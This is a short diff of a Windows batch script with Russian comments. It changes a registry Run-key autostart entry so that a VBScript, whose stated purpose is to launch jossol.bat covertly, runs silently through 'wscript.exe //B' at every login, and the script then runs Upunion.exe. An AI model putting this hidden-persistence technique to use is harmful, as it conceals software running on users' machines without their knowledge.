@@ -49,7 +49,7 @@ echo Set WshShell = Nothing >> "%vbsfile%"
 rem Добавление VBScript в автозагрузку, чтобы запускать jossol.bat скрытно
 echo Adding VBScript to startup...
 set "regkey=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
-reg add "%regkey%" /v "jossol" /t REG_SZ /d "%vbsfile%" /f
+reg add "%regkey%" /v "jossol" /t REG_SZ /d "wscript.exe //B \"%vbsfile%\"" /f
 
 rem Запуск Upunion.exe
 echo Running Upunion.exe...
